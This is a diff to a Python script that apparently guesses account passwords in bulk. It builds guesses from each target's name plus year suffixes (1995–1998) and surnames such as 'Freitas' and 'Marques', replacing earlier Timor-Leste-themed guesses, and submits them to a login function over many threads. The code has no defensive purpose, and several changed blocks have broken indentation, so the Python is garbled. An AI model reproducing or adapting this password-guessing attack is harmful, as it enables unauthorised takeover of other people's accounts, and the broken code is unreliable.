@@ -215,15 +215,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '123',
-                         str(x) + '1234',
-                         str(x) + '12345',
-                         str(x) + '123456'
+                          str(x) + '1995',
+                         str(x) + '1996',
+                         str(x) + '1997',
+                         str(x) + '1998'
                          ]
-                    litpas.append('timor-leste')
-                    litpas.append('timorleste')
-                    litpas.append('guterres')
-                    litpas.append('sagitarius')
+                    litpas.append('Freitas')
+                    litpas.append('freitas')
+                    litpas.append('Marques')
+                    litpas.append('marques')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -249,15 +249,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '123',
-                         str(x) + '1234',
-                         str(x) + '12345',
-                         str(x) + '123456'
+                         str(x) + '1995',
+                         str(x) + '1996',
+                         str(x) + '1997',
+                         str(x) + '1998'
                          ]
-                    litpas.append('timor-leste')
-                    litpas.append('timorleste')
-                    litpas.append('guterres')
-                    litpas.append('sagitarius')
+                    litpas.append('Freitas')
+                    litpas.append('freitas')
+                    litpas.append('Marques')
+                    litpas.append('marques')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -281,15 +281,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '123',
-                           str(x) + '1234',
-                           str(x) + '12345',
-                           str(x) + '123456'
-                           ]
-                      litpas.append('timor-leste')
-                      litpas.append('timorleste')
-                      litpas.append('guterres')
-                      litpas.append('sagitarius')
+                         str(x) + '1995',
+                         str(x) + '1996',
+                         str(x) + '1997',
+                         str(x) + '1998'
+                         ]
+                    litpas.append('Freitas')
+                    litpas.append('freitas')
+                    litpas.append('Marques')
+                    litpas.append('marques')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -306,15 +306,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '123',
-                           str(x) + '1234',
-                           str(x) + '12345',
-                           str(x) + '123456'
-                           ]
-                      litpas.append('timor-leste')
-                      litpas.append('timorleste')
-                      litpas.append('guterres')
-                      litpas.append('sagitarius')
+                            str(x) + '1995',
+                         str(x) + '1996',
+                         str(x) + '1997',
+                         str(x) + '1998'
+                         ]
+                    litpas.append('Freitas')
+                    litpas.append('freitas')
+                    litpas.append('Marques')
+                    litpas.append('marques')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -331,15 +331,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '123',
-                           str(x) + '1234',
-                           str(x) + '12345',
-                           str(x) + '123456'
-                           ]
-                      litpas.append('timor-leste')
-                      litpas.append('timorleste')
-                      litpas.append('guterres')
-                      litpas.append('sagitarius')
+                           str(x) + '1995',
+                         str(x) + '1996',
+                         str(x) + '1997',
+                         str(x) + '1998'
+                         ]
+                    litpas.append('Freitas')
+                    litpas.append('freitas')
+                    litpas.append('Marques')
+                    litpas.append('marques')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -355,15 +355,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '123',
-                           str(x) + '1234',
-                           str(x) + '12345',
-                           str(x) + '123456'
-                           ]
-                      litpas.append('timor-leste')
-                      litpas.append('timorleste')
-                      litpas.append('guterres')
-                      litpas.append('sagitarius')
+                           str(x) + '1995',
+                         str(x) + '1996',
+                         str(x) + '1997',
+                         str(x) + '1998'
+                         ]
+                    litpas.append('Freitas')
+                    litpas.append('freitas')
+                    litpas.append('Marques')
+                    litpas.append('marques')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
